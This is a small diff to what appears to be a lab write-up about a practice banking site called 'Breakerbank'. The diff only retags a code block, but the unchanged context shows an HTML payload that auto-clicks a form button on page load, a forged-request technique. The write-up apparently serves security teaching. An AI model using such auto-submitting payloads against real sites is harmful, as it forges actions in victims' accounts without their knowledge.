@@ -15,7 +15,7 @@
 
 ### POST form with any value after editing the page source starting from body 
 
-```
+```javascript
 <body onload="javascript:a()"></body>
 <script type="text/javascript">function a(){document.getElementById("button").click();}</script>
 <h1>Breakerbank</h1>
